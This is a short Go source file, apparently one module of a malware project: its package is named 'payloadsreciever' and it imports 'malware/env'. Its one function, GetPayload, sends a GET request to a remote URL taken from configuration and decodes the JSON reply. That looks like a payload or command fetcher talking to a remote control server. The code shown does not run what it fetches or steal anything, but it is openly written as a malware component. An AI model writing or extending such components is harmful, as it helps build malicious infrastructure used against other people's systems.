package payloadsreciever

import (
	"net/http"
	. "malware/env"
	"encoding/json"
)

type Response struct {
	Body   interface{} `json:"body"` // Parsed JSON object
	Status int         `json:"status"`
}

func GetPayload(env Env) (*Response, error) {
	// Make the GET request
	resp, err := http.Get(env.RemoteURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// Parse the JSON response
	var bodyData interface{}
	err = json.NewDecoder(resp.Body).Decode(&bodyData)
	if err != nil {
		return nil, err
	}

	// Return the response object
	return &Response{
		Body:   bodyData,
		Status: resp.StatusCode,
	}, nil
}